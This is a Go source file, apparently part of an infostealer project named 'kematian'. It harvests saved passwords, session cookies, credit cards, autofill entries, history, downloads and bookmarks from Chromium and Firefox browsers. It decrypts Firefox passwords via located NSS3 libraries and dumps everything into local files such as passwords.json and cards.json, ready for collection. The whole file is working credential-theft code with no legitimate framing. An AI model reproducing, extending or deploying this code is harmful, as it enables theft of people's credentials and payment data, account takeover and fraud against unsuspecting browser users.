package browsers

import (
	"encoding/json"
	"kdot/kematian/browsers/chromium/autofillChromium"
	"kdot/kematian/browsers/chromium/bookmarksChromium"
	"kdot/kematian/browsers/chromium/cardsChromium"
	"kdot/kematian/browsers/chromium/cookiesChromium"
	"kdot/kematian/browsers/chromium/downloadsChromium"
	"kdot/kematian/browsers/chromium/historyChromium"
	"kdot/kematian/browsers/chromium/passChromium"
	"kdot/kematian/browsers/finder"
	"kdot/kematian/browsers/gecko/cookiesGecko"
	"kdot/kematian/browsers/gecko/passwordsGecko"
	"kdot/kematian/browsers/structs"
	"os"
)

type Passwords struct {
	OriginURL string `json:"origin_url"`
	Username  string `json:"username"`
	Password  string `json:"password"`
}

type BrowserPasswords struct {
	Chromium []Passwords `json:"chromium,omitempty"`
	Gecko    []Passwords `json:"gecko,omitempty"`
}

func GetBrowserPasswords(browsers []structs.Browser) {
	chromiumJSON := passChromium.Get(browsers)
	geckoJSON := passwordsGecko.Get(browsers, finder.FindNSS3Locations())

	var chromiumPasswords, geckoPasswords []Passwords

	if len(chromiumJSON) > 0 {
		err := json.Unmarshal(chromiumJSON, &chromiumPasswords)
		if err != nil {
			panic(err)
		}
	}

	if len(geckoJSON) > 0 {
		err := json.Unmarshal(geckoJSON, &geckoPasswords)
		if err != nil {
			panic(err)
		}
	}

	combinedPasswords := BrowserPasswords{
		Chromium: chromiumPasswords,
		Gecko:    geckoPasswords,
	}

	if len(combinedPasswords.Chromium) > 0 || len(combinedPasswords.Gecko) > 0 {
		passwordsJSON, err := json.MarshalIndent(combinedPasswords, "", "    ")
		if err != nil {
			panic(err)
		}
		os.WriteFile("passwords.json", passwordsJSON, 0644)
	}
}

func GetBrowserCookies(browsers []structs.Browser) {
	cookies_mozilla := cookiesGecko.GetCookies(browsers)
	cookies_chromium := cookiesChromium.GetCookies(browsers)
	cookies := append(cookies_mozilla, cookies_chromium...)
	for _, cookie := range cookies {
		fileName := "cookies_netscape_" + cookie.BrowserName + ".txt"
		os.WriteFile(fileName, []byte(cookie.Cookies), 0644)
	}
}

func GetBrowserHistory(browsers []structs.Browser) {
	os.WriteFile("history.json", []byte(historyChromium.Get(browsers)), 0644)
}

func GetBrowserAutofill(browsers []structs.Browser) {
	os.WriteFile("autofill.json", []byte(autofillChromium.Get(browsers)), 0644)
}

func GetBrowserCards(browsers []structs.Browser) {
	os.WriteFile("cards.json", []byte(cardsChromium.Get(browsers)), 0644)
}

func GetBrowserDownloads(browsers []structs.Browser) {
	os.WriteFile("downloads.json", []byte(downloadsChromium.Get(browsers)), 0644)
}

func GetBrowserBookmarks(browsers []structs.Browser) {
	os.WriteFile("bookmarks.json", []byte(bookmarksChromium.Get(browsers)), 0644)
}

func GetBrowserData(totalBrowsers []structs.Browser) {
	GetBrowserPasswords(totalBrowsers)
	GetBrowserHistory(totalBrowsers)
	GetBrowserCookies(totalBrowsers)
	GetBrowserDownloads(totalBrowsers)
	GetBrowserCards(totalBrowsers)
	GetBrowserAutofill(totalBrowsers)
	GetBrowserBookmarks(totalBrowsers)
}
